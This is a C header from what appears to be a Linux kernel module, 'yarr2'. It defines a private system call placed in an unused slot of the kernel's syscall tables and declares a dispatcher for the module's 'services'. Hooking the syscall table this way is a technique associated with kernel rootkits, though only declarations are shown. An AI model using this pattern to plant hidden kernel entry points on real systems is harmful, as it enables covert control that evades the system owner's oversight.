#ifndef __YARR_YARRCALL
#define __YARR_YARRCALL

#include <linux/syscalls.h>

// TODO: The vector used was available in my kernels, however I wouldn't be
// surprised if in other kernels that vector is used. This could happen if
// other kernels are built with other CONFIG_<WHATEVER> macros that enable
// some other system calls that I don't have here.

/**
 * This is the vector used for accessing yarr2 services. It was chosen after
 * looking for some position in the sys_call_table and ia32_sys_call_table that
 * wasn't in use (i.e. sys_ni_syscall was there).
 */
#define YARR_VECTOR (134)

// TODO: I think the second paramenter should be a union with the different
// structures with params for each service yarr2 would be able to offer.

/**
 * Entry point of the yarr system call, a wrapper to properly read the
 * pt_regs structure that resides in the stack and then call yarrcall(), which
 * will handle the service requested.
 *
 * @regs: A representation in memory of the registers when the instruction
 * syscall was issued. Registers rdi and rsi contains the parameters we expect.
 * @return: Zero on success, non-zero elsewhere.
 */
asmlinkage long entry_yarrcall(struct pt_regs *regs);

/**
 * As with the system calls, yarr has its own entry point to ask for services.
 * This is that entry point. This function is installed in some entry in the
 * syscall table and user-land programs.
 *
 * @svc: The index of the service to request.
 * @params: A pointer to the parameters of the services requested.
 * @return: Zero on success, non-zero elsewhere.
 */
long yarrcall(int svc, void *params);

#endif
